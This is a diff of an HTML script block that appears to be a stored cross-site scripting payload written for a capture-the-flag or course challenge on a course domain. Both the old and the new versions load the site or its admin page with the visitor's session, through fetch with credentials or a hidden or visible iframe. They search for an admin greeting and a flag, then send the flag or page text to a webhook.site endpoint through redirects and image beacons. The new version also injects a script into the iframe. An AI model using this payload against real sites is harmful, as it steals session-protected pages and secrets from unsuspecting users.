@@ -1,44 +1,52 @@
 <script>
-console.log('v12');
-fetch('https://cats.is-course.ru/', {
-    credentials: 'include'
-})
-.then(r => r.text())
-.then(html => {
-    if(html.includes('Welcome, admin!')) {
-        var flagMatch = html.match(/flag{[^}]+}/);
-        if(flagMatch) {
-            window.location = "https://webhook.site/ТВОЙ_ID?flag=" + flagMatch[0];
-        } else {
-            window.location = "https://webhook.site/ТВОЙ_ID?admin_page_found=" + 
-                encodeURIComponent(btoa(html.substring(0, 5000)));
-        }
-    } else {
-        fetch('https://cats.is-course.ru/admin', {
-            credentials: 'include'
-        })
-        .then(r => r.text())
-        .then(adminHtml => {
-            window.location = "https://webhook.site/ТВОЙ_ID?admin_page=" + 
-                encodeURIComponent(btoa(adminHtml.substring(0, 5000)));
-        });
-    }
-})
-.catch(e => {
-    var iframe = document.createElement('iframe');
-    iframe.src = 'https://cats.is-course.ru/';
-    iframe.style.display = 'none';
-    iframe.onload = function() {
-        try {
-            var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-            var html = iframeDoc.documentElement.outerHTML;
-            if(html.includes('Welcome, admin!')) {
-                new Image().src = "https://webhook.site/ТВОЙ_ID?admin_detected_in_iframe";
+console.log('v13');
+
+var iframe = document.createElement('iframe');
+iframe.src = 'https://cats.is-course.ru/';
+iframe.style.width = '100%';
+iframe.style.height = '500px';
+
+iframe.onload = function() {
+    try {
+        var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+        var html = iframeDoc.documentElement.outerHTML;
+        var text = iframeDoc.body.innerText;
+
+        if(text.includes('Welcome, admin!')) {
+            var flagMatch = text.match(/flag{[^}]+}/);
+            if(flagMatch) {
+                window.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?VICTORY_FLAG=" + flagMatch[0];
+            } else {
+                new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?admin_no_flag=" + 
+                    encodeURIComponent(text.substring(0, 1000));
             }
-        } catch(e) {
-            new Image().src = "https://webhook.site/ТВОЙ_ID?iframe_error";
+        } else {
+            new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?not_admin_in_iframe";
         }
-    };
-    document.body.appendChild(iframe);
-});
+    } catch(e) {
+        setTimeout(function() {
+            var currentUrl = iframe.contentWindow.location.href;
+            new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?iframe_url=" + 
+                encodeURIComponent(currentUrl);
+        }, 1000);
+    
+        var script = document.createElement('script');
+        script.innerHTML = `
+            if(document.body.innerText.includes('Welcome, admin!')) {
+                var flagMatch = document.body.innerText.match(/flag{[^}]+}/);
+                if(flagMatch) {
+                    window.top.location = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?INNER_FLAG=" + flagMatch[0];
+                }
+            }
+        `;
+        try {
+            iframe.contentDocument.head.appendChild(script);
+        } catch(e) {
+            console.log('error');
+        }
+    }
+};
+
+document.body.appendChild(iframe);
+new Image().src = "https://webhook.site/bf30006e-dd6b-4685-8545-432615830517?iframe_created";
 </script>
